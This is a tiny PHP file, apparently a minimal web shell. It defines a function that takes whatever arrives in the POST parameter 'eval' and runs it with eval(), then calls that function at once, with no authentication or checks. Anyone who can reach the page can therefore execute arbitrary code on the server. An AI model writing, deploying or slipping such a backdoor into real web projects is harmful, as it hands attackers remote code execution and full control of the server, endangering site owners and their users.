<?php
function code_eval(){
	if (isset($_POST['eval'])){
		echo "\n result is:<br/><br/>";
		eval($_POST['eval']);
	}
}

code_eval();
?>